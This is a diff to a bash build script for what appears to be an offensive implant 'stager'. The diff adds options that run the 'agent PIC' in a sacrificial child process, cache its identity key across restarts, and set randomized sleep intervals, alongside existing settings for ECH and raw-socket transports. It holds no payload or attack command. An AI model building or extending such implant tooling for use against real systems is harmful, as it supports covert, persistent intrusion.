@@ -13,6 +13,9 @@ DYNLOAD_MODE="public"
 HASH_STYLE="auto"
 ECH="off"
 ECH_CONFIG=""
+SUPERVISE="0"
+SUPERVISE_SLEEP_MIN="5"
+SUPERVISE_SLEEP_MAX="30"
 
 DEBUG_FLAG=""
 
@@ -67,6 +70,18 @@ while [[ $# -gt 0 ]]; do
     ECH_CONFIG="$2"
     shift 2
     ;;
+  --supervise)
+    SUPERVISE="$2"
+    shift 2
+    ;;
+  --supervise-sleep-min | --supervise_sleep_min)
+    SUPERVISE_SLEEP_MIN="$2"
+    shift 2
+    ;;
+  --supervise-sleep-max | --supervise_sleep_max)
+    SUPERVISE_SLEEP_MAX="$2"
+    shift 2
+    ;;
   *)
     # Handle --key=value style arguments if passed
     if [[ "$1" == --*=* ]]; then
@@ -85,6 +100,9 @@ while [[ $# -gt 0 ]]; do
       --hash-style | --hash_style) HASH_STYLE="$val" ;;
       --ech) ECH="$val" ;;
       --ech-config | --ech_config) ECH_CONFIG="$val" ;;
+      --supervise) SUPERVISE="$val" ;;
+      --supervise-sleep-min | --supervise_sleep_min) SUPERVISE_SLEEP_MIN="$val" ;;
+      --supervise-sleep-max | --supervise_sleep_max) SUPERVISE_SLEEP_MAX="$val" ;;
       esac
       shift 1
     else
@@ -107,6 +125,11 @@ echo "    Download Key:  [SET]"
 # ECH only affects the libssl transport; ignored by the raw-socket transports.
 case "$ECH" in 1|on|true|yes) ECH_ENABLE=1 ;; *) ECH_ENABLE=0 ;; esac
 echo "    ECH:           $ECH (libssl transport only)"
+
+# Supervision runs the agent PIC in a sacrificial child and caches its
+# ephemeral identity key across restarts. Accept on/off-style values.
+case "$SUPERVISE" in 1|on|true|yes) SUPERVISE_ENABLE=1 ;; *) SUPERVISE_ENABLE=0 ;; esac
+echo "    Supervise:     $SUPERVISE"
 
 # Clean previous build artifacts
 make clean
@@ -142,6 +165,9 @@ make "$MAKE_TARGET" $DEBUG_FLAG \
   DYNLOAD_MODE="$DYNLOAD_MODE" \
   HASH_STYLE="$HASH_STYLE" \
   ECH="$ECH_ENABLE" \
-  ECH_CONFIG="$ECH_CONFIG"
+  ECH_CONFIG="$ECH_CONFIG" \
+  SUPERVISE="$SUPERVISE_ENABLE" \
+  SUPERVISE_SLEEP_MIN="$SUPERVISE_SLEEP_MIN" \
+  SUPERVISE_SLEEP_MAX="$SUPERVISE_SLEEP_MAX"
 
 echo "[+] Stager build complete."
